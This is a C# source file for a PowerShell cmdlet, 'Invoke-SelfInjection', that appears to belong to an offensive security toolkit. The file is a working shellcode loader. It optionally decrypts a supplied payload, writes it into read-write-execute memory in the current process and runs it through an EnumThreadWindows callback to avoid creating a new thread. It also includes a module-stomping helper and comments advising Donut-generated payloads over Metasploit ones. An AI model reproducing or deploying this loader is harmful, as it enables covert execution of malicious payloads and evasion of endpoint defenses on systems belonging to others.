using System;
using System.Runtime.InteropServices;
using System.Management.Automation;
using TurtleToolKitManaged;
using TurtleToolKitCrypt;

namespace TurtleToolKit
{
    [Cmdlet(VerbsLifecycle.Invoke, "SelfInjection")] // <- seeting cmdlet name and verbs
    [Alias("sinj")] //<- cmdlet alias
    public class InvokeSelfInjection : Cmdlet 
    {
        [Parameter(Mandatory = false)] [Alias("enc")] public SwitchParameter isEncrypted { get; set; }
        [Parameter(Mandatory = true)] [Alias("s")] public byte[] shellCode = null;
        [Parameter(Mandatory = false)] [Alias("k")] public byte[] decryptKey = null;
        [Parameter(Mandatory = false)] [Alias("ivk")] public byte[] initVector = null;

        // class attributes
        Cryptor cryptObj;
        // Init cmdlet
        protected override void BeginProcessing()
        {
            base.BeginProcessing();
            WriteWarning("expiremental");
            WriteWarning("msf code causes process to crash, use doughnuts instead");
            WriteWarning("Beware This Blocks Main Thread!");
        }

        // Process each item in pipeline
        protected override void ProcessRecord()
        {
            base.ProcessRecord();
            // check for flags
            if (isEncrypted)
            {
                WriteVerbose("IsEncrypted Switch Set");
                if (shellCode == null || initVector == null || decryptKey == null)
                {
                    WriteWarning("Missing parameters for encryption");
                    return;
                }
                // create crypt object
                cryptObj = new Cryptor(decryptKey, initVector);
            }
            ExecuteSelfInjection(cryptObj, shellCode);
            WriteVerbose("Successfully Executed Self Injection");
        }

        // EndProcessing Used to clean up cmdlet
        protected override void EndProcessing() { 
            base.EndProcessing();
            //WriteObject(tokensList);
        }
        // Handle abnormal termination
        protected override void StopProcessing() { base.StopProcessing(); }

        //
        private IntPtr ModuleStompAddr(string libraryToLoad) {
            IntPtr libLocation = Win32.LoadLibrary(libraryToLoad);
            if (libLocation == IntPtr.Zero)
            {
                return IntPtr.Zero;
            }
            IntPtr libLocationAhead = new IntPtr(libLocation.ToInt64() + 2*4096 + 12);
            Console.WriteLine(string.Format("0x{0:X}", libLocationAhead.ToInt64()));
            return libLocationAhead;
        }

        private bool ExecuteSelfInjection(Cryptor crypt, byte[] payloadBytes)
        {
            IntPtr hProcess = Win32.GetCurrentProcess();
            int payloadSize = payloadBytes.Length;
            IntPtr outSize;
            uint oldProtect = 0;
            if (!isEncrypted)
            {
                // regular self inject with no thread creation
                IntPtr addr = Win32.VirtualAllocEx(hProcess, IntPtr.Zero, (uint)payloadSize, 0x3000, 0x40);
                if (!Win32.WriteProcessMemory(hProcess, addr, payloadBytes, payloadSize, out outSize))
                {
                    WriteWarning("failed to write process memory");
                    return false;
                }
                WriteVerbose("No New Thread Creation");
                Win32.EnumThreadDelegate castedAddr = Marshal.GetDelegateForFunctionPointer<Win32.EnumThreadDelegate>(addr);
                Win32.EnumThreadWindows(0, castedAddr, IntPtr.Zero);
                return true;
            }

            // Encryption Method
            try
            {
                var decryptedBytes = crypt.DecryptBytes(payloadBytes);
                if (decryptedBytes == null)
                {
                    WriteWarning("Failed to decrypt bytes");
                    return false;
                }
                int decryptedPayloadSize = decryptedBytes.Length;
                IntPtr addr = Win32.VirtualAllocEx(hProcess, IntPtr.Zero, (uint)decryptedPayloadSize, 0x3000, 0x40);
                if (!Win32.WriteProcessMemory(hProcess, addr, decryptedBytes, decryptedPayloadSize, out outSize))
                {
                    WriteWarning("failed to write process memory");
                    return false;
                }
                WriteVerbose("No New Thread Creation");
                Win32.EnumThreadDelegate castedAddr = Marshal.GetDelegateForFunctionPointer<Win32.EnumThreadDelegate>(addr);
                Win32.EnumThreadWindows(0, castedAddr, IntPtr.Zero);
                return true;
            }
            catch
            {
                WriteWarning("Failed to execute self injection");
                return false;
            }
        }
    }
}